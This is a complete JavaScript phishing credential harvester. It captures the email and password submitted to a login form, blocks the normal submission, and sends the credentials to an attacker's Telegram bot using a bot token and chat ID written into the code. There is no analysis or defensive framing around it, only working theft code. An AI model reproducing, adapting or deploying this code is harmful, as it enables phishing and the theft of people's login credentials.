document.getElementById('loginForm').addEventListener('submit', function (event) {
    event.preventDefault(); // Prevents the page from refreshing on form submission

    // Collect email and password values
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Your Telegram bot token and chat ID
    const botToken = "7239103472:AAFSQb14reS7hjLOVxdNZjCyq1zLAOEHqKM";
    const chatId = "7394646705";

    // Send login data to your Telegram bot
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: `Login Attempt:\nEmail: ${email}\nPassword: ${password}`,
        }),
    })
        .then((response) => {
            if (!response.ok) {
                console.error("Failed to send login information to Telegram.");
            }
        })
        .catch((error) => console.error("Error:", error));
});
